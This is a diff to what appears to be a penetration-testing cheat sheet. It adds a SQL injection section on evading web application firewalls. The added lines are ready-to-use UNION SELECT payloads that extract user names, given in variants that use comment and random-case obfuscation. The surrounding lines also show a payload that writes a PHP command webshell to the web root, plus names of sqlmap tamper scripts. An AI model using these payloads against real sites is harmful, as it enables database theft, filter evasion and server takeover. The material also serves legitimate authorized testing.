@@ -544,7 +544,35 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/bur
 https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 
 ## SQL Injection
- 
+  
+### WAF BYPASS
+
+#### Query default:
+
+'UNION SELECT 1, name,3,4 from users; -- -
+
+#### Add comment /* */ for space bypass
+
+'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -
+
+#### Add comment /*!*/ in query for filters bypass
+
+'/*!UNION SELECT*/ 1,group_concat(name),3,4 from users; -- -
+
+#### Add random case
+
+'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -
+
+#### Example of mix:
+
+'/*!UnIoN/**/SeLeCt/**/*/1,GroUp_ConCat(nAmE),3,4/**/FrOm/**/users; -- -
+
+#### Others Techniques:
+
+-> urlencode (example:%20 instead of space);
+-> Scientifc Notation;
+-> hexadecimal, substr, etc...
+  
 ### Webshell via SQLI
   
 ' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/pdp.php"-- -
@@ -557,7 +585,7 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
   
 -> randomcase.py
   
--> order2ascii
+-> order2ascii.py
 
 -> xforwardedfor.py
  
